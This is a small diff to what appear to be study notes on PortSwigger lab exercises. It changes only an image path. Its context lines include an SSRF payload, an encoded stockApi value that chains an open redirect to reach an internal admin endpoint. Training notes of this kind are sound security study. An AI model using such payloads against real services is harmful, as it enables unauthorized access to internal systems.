@@ -1229,7 +1229,7 @@ https://0ae8000a032748ebc12e083600260006.web-security-academy.net/product/nextPr
 stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin
 ```  
 
-![SSRF Open Rerdirect](ssrf-open-rerdirect.png)  
+![SSRF Open Rerdirect](images/ssrf-open-rerdirect.png)  
 
 [PortSwigger Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)  
   
